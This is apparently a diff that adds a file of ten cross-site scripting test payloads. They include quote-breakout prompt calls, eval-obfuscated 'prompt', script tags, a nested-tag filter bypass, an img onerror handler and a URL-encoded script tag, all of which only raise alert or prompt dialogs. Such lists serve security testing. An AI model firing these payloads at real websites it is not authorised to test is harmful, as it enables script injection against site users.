@@ -1,0 +1,10 @@
+"-prompt(xss.n)-"
+'-prompt(xss.n)-'
+";a=prompt,a(xss.n)//
+';a=prompt,a(xss.n)//
+'-eval("window['pro'%2B'mpt'](xss.n)")-'
+"-eval("window['pro'%2B'mpt'](xss.n)")-"
+<script>alert(xss.n)</script>
+<scr<script>ipt>alert(xss.n)</scr<script>ipt>
+"><img src=x onerror=alert(xss.n)>
+%3Cscript%3Ealert%28xss.n%29%3C%2Fscript%3E
